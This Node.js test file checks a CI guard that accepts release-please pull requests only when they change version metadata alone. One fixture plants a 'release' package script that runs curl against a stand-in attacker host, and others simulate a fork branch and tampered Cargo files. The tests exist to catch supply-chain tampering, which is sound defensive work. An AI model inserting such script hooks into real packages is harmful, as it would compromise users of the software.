import assert from 'node:assert/strict';
import test from 'node:test';

import {
  RELEASE_METADATA_PATHS,
  RELEASE_PLEASE_BRANCH,
  isReleaseMetadataOnly,
  releaseMetadataContentsMatch,
} from './ci-scope.mjs';

const repository = 'MLGBJDLW/Nexa';
const releasePaths = [...RELEASE_METADATA_PATHS];

const baseFiles = {
  '.release-please-manifest.json': '{".":"0.13.2","other":"stable"}\n',
  'CHANGELOG.md': '# Changelog\n\n## [0.13.2]\n\n- Existing\n',
  'Cargo.lock': `[[package]]
name = "nexa-core"
version = "0.13.2"

[[package]]
name = "nexa-desktop"
version = "0.13.2"

[[package]]
name = "serde"
version = "1.0.0"
`,
  'apps/desktop/package.json':
    '{"name":"nexa-desktop","version":"0.13.2","dependencies":{"react":"19.0.0"}}\n',
  'apps/desktop/src-tauri/Cargo.toml': `[package]
name = "nexa-desktop"
version = "0.13.2"

[dependencies]
nexa-core = { path = "../../../crates/core" }
`,
  'apps/desktop/src-tauri/tauri.conf.json':
    '{"productName":"Nexa","version":"0.13.2","bundle":{"active":true}}\n',
  'crates/core/Cargo.toml': `[package]
name = "nexa-core"
version = "0.13.2"

[features]
default = []
`,
  'package-lock.json':
    '{"name":"nexa","version":"0.13.2","lockfileVersion":3,"packages":{"":{"version":"0.13.2"},"node_modules/react":{"version":"19.0.0"}}}\n',
  'package.json':
    '{"name":"nexa","version":"0.13.2","scripts":{"test":"node --test"}}\n',
};

const headFiles = Object.fromEntries(
  Object.entries(baseFiles).map(([changedPath, contents]) => [
    changedPath,
    contents
      .replaceAll('0.13.2', '0.14.0')
      .replace('- Existing', '- Existing\n- Generated release note'),
  ]),
);

function releaseScope(overrides = {}) {
  const selectedBaseFiles = overrides.baseFiles ?? baseFiles;
  const selectedHeadFiles = overrides.headFiles ?? headFiles;
  return {
    branch: RELEASE_PLEASE_BRANCH,
    headRepository: repository,
    repository,
    changedPaths: releasePaths,
    readBaseFile: (changedPath) => selectedBaseFiles[changedPath],
    readHeadFile: (changedPath) => selectedHeadFiles[changedPath],
    ...overrides,
  };
}

test('accepts only the repository-owned release-please metadata change set', () => {
  for (const changedPath of releasePaths) {
    assert.equal(
      releaseMetadataContentsMatch(changedPath, baseFiles[changedPath], headFiles[changedPath]),
      true,
      `${changedPath} should contain only generated release metadata`,
    );
  }
  assert.equal(
    isReleaseMetadataOnly(releaseScope()),
    true,
  );
});

test('rejects an empty change set', () => {
  assert.equal(
    isReleaseMetadataOnly(releaseScope({ changedPaths: [] })),
    false,
  );
});

test('rejects a lookalike branch from a fork', () => {
  assert.equal(
    isReleaseMetadataOnly(releaseScope({ headRepository: 'attacker/Nexa' })),
    false,
  );
});

test('rejects an ordinary branch even when it changes only version files', () => {
  assert.equal(
    isReleaseMetadataOnly(releaseScope({ branch: 'fix/version-files' })),
    false,
  );
});

test('rejects any non-metadata file on the trusted release branch', () => {
  assert.equal(
    isReleaseMetadataOnly(
      releaseScope({ changedPaths: [...releasePaths, 'crates/core/src/lib.rs'] }),
    ),
    false,
  );
});

test('rejects package scripts or dependencies hidden beside a version bump', () => {
  const tamperedHead = {
    ...headFiles,
    'package.json':
      '{"name":"nexa","version":"0.14.0","scripts":{"test":"node --test","release":"curl attacker.invalid"}}\n',
  };
  assert.equal(isReleaseMetadataOnly(releaseScope({ headFiles: tamperedHead })), false);
});

test('rejects Cargo features or dependencies hidden beside a version bump', () => {
  const tamperedHead = {
    ...headFiles,
    'crates/core/Cargo.toml': `[package]
name = "nexa-core"
version = "0.14.0"

[features]
default = ["unsafe-release-feature"]
`,
  };
  assert.equal(isReleaseMetadataOnly(releaseScope({ headFiles: tamperedHead })), false);
});

test('rejects non-workspace Cargo.lock mutations', () => {
  const tamperedHead = {
    ...headFiles,
    'Cargo.lock': headFiles['Cargo.lock'].replace(
      'name = "serde"\nversion = "1.0.0"',
      'name = "serde"\nversion = "1.0.1"',
    ),
  };
  assert.equal(isReleaseMetadataOnly(releaseScope({ headFiles: tamperedHead })), false);
});

test('fails closed when an allowlisted file cannot be read from either revision', () => {
  assert.equal(
    isReleaseMetadataOnly({
      ...releaseScope(),
      readHeadFile: () => {
        throw new Error('missing head blob');
      },
    }),
    false,
  );
});
